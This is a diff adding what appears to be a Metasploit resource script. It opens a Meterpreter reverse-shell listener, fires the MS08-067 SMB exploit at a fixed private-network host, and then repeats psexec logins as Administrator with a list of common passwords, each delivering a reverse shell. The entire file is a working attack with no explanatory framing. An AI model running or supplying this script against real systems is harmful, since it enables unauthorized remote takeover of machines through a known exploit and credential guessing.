@@ -1,0 +1,68 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+setg DisablePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass admin
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass root
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass toor
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass password
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass violent
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass password1
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass 12345
+set RHOST 192.168.32.95
+set payload windows/meterpreter/reverse_tcp
+set LPORT 7777
+set LHOST 192.168.32.94
+exploit -j -z
